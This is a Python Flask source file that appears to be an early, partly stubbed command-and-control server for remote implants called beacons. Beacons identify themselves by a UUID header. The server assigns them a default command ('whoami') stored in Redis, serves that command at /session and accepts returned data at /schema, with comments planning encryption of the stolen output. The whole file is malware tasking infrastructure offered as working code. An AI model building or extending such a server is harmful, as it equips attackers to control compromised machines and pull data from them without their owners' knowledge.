# beacons checking in supply a UUID that is hashed
# the hash is compared to a precompiled list of them?
# the uuid is stored in memory in a table
# but how are commands stored and retrieved
# maybe the tables are each named after the beacon
# so use postgresql to create a series of tables in a db
# the flask webserver sees the UUID then performs a fetch from the db
# e z p z

import datetime
from flask import *
import re
import redis  # Make sure to install and start the redis server
# sudo systemctl start redis-server.service
import string


conn = redis.StrictRedis(host='localhost', port=6379, db=0)
print('test')
conn.mset({"test": "test1"})
app = Flask(__name__)


@app.route("/")
def home():
    # Grab the appsessionid value from the headers
    uuid = request.headers['APPSESSIONID']
    if set(uuid).difference(string.ascii_letters + string.digits):
        # We're not going to bother with input sanitization here
        # If we receive special characters just drop it entirely
        pass
    else:
        '''
        # Create an object for the new beacon
        # It gets a name, check-in date, and command
        beacon = {f"ID:{uuid}": (
            {
                "IP": {'name'},
                "Date": 'date',
                "Command": "test"
            })
        }
        # Commit this
        with conn.pipeline() as pipe:
            for h_id, ID in beacon.items():
                pipe.hset(h_id, ID)
                #pipe.execute()
        conn.bgsave()
        '''
        # Set a default command
        Command = "whoami"
        # Write the message value to the beacon:UUID key
        #conn.mset({uuid: Command})
        conn.hset('UUID', uuid, Command)
        return ('')


@app.route('/session', methods=['GET'])
def session():
    # This function handles the beacon requesting a command
    if request.method == 'GET':
        uuid = request.headers['APPSESSIONID']
        if set(uuid).difference(string.ascii_letters + string.digits):
            # We're not going to bother with input sanitization here
            # If we receive special characters just drop it entirely
            pass
        else:
            command = conn.hget('UUID', uuid)
            # We should wipe the command from the var
            return command


@app.route("/schema", methods=['POST'])
def schema():
    # This function handles beacons returning data
    if request.method == 'POST':
        uuid = request.headers['APPSESSIONID']
        if set(uuid).difference(string.ascii_letters + string.digits):
            # We're not going to bother with input sanitization here
            # If we receive special characters just drop it entirely
            pass
        else:
            # We should expect data returned to be encrypted
            # So let's handle decrypting it
            # Maybe use a hash of the UUID as the key??
            return 'HELO'


def serve():
    app.run()#ssl_context='adhoc')


if __name__ == "__main__":
    serve()